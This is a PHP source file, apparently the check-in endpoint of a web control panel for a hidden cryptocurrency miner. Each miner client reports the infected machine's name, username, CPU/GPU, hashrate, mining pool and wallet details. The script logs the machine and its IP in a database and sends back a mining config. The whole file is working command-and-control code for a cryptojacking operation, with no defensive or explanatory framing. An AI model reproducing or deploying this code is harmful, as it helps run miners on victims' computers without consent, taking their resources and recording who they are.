<?php
/* Made by Unam Sanctam https://github.com/UnamSanctam */
require_once(dirname(__DIR__, 1) . '/assets/php/session-header.php');

$data = json_decode(file_get_contents('php://input'), true);
if(json_last_error() != JSON_ERROR_NONE) {
    echo "Error: Invalid data";
    return;
}

function getData($key){
    global $data;
    return $data[$key] ?? '';
}

$uqhash = substr(md5(getData('computername').getData('cpu')), 0, 16);
$type = getData('type');

$miner = $base->unam_dbSelect(getConn(), 'miners', 'ms_minerID, ms_config', ['ms_uqhash' => $uqhash, 'ms_type'=>$type]);

$fields = [
    'ms_ip'=>$hostaddress,
    'ms_status'=>getData('status'),
    'ms_computername'=>getData('computername'),
    'ms_username'=>getData('username'),
    'ms_hashrate'=>getData('hashrate'),
    'ms_pool'=>getData('pool'),
    'ms_port'=>getData('port'),
    'ms_algorithm'=>getData('algo'),
    'ms_password'=>getData('password'),
    'ms_user'=>getData('user'),
    'ms_worker'=>getData('worker'),
    'ms_cpu'=>getData('cpu'),
    'ms_gpu'=>getData('gpu'),
    'ms_remoteURL'=>getData('remoteconfig'),
    'ms_lastConnection'=>$currentDate
];

if ($miner) {
    $base->unam_dbUpdate(getConn(), 'miners', $fields, ['ms_uqhash' => $uqhash, 'ms_type'=>$type]);
} else {
    $base->unam_dbInsert(getConn(), 'miners', array_merge(['ms_uqhash'=>$uqhash, 'ms_type'=>$type, 'ms_config'=>($type == 'xmrig' ? 1 : 2)], $fields));
}

$config = $base->unam_dbSelect(getConn(), 'configs', 'cf_data', ['cf_configID' => $miner['ms_config'] ?? 0]);
echo $config['cf_data'] ?? 'OK';